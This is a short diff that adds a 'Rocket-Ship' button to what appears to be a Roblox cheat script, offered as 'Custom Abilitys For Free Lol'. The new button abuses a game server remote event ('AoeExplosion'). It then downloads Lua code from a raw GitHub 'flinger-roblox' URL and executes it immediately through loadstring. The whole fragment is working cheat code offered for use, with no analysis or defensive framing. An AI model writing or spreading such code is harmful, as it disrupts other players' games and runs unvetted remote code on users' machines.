@@ -53,3 +53,12 @@ Tab:AddButton({
 })
 
 Tab:AddLabel("Custom Abilitys For Free Lol")
+
+Tab:AddButton({
+	Name = "Rocket-Ship",
+	Callback = function()
+      		game:GetService("ReplicatedStorage").rhythmevent:FireServer("AoeExplosion",0)
+              wait(0.01)
+         loadstring(game:HttpGet('https://raw.githubusercontent.com/LoserGrape/flinger-roblox/main/chatgpt%20fart'))()
+  	end    
+})
